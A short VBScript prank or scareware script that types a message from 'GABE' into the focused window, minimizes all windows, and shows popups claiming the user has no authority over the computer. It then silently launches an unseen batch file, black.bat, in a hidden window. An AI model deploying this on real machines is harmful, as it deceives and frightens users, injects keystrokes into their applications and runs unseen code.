set ghost = wscript.CreateObject("WScript.Shell")

wscript.sleep 500
ghost.sendkeys "Hello. "
wscript.sleep 1000
ghost.sendkeys "I am GABE "
wscript.sleep 500
ghost.sendkeys "I have taken "
wscript.sleep 1000
ghost.sendkeys "the liberty"
wscript.sleep 1500
ghost.sendkeys " to install my"
wscript.sleep 1000
ghost.sendkeys " extra features"
wscript.sleep 1000
ghost.sendkeys " to the"
wscript.sleep 1000
ghost.sendkeys " system"
wscript.sleep 1000
set oShellApp = CreateObject("Shell.Application")

oShellApp.MinimizeAll

CreateObject("WScript.Shell").Popup "You now have", 1, "GABE"
wscript.sleep 500
CreateObject("WScript.Shell").Popup "No Authority", 1, "GABE"
CreateObject("WScript.Shell").Popup "over this", 1, "GABE"
CreateObject("WScript.Shell").Popup "Computer", 1, "GABE"
wscript.sleep 1000

MsgBox "(:",4112," "


Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c black.bat", 0, True



' MsgBox "You",0,"GABE"
' wscript.sleep 300
' MsgBox "now have",0,"GABE"

' MsgBox "NO",0,"GABE"

' MsgBox "Authority",0,"GABE"

' MsgBox "over this",0,"GABE"
' MsgBox "Computer",0,"GABE"

